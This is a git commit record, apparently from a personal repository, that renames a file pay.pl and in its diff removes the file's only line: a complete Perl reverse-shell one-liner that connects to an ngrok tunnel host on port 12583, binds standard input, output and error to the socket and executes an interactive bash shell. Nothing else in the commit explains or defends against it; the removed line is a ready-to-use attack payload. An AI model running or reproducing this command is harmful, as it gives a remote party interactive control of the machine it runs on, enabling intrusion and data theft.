52f545b497906b840b4330c2001a54ca959edd0d
rumahjsp <2406045@itg.ac.id>
2026-01-09 13:37:54 +0700

    Update and rename pay.pl to fay.pl

--- pay.pl
+++
@@ -1,1 +0,0 @@
-perl -e 'use Socket;$i="0.tcp.ap.ngrok.io";$p=12583;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
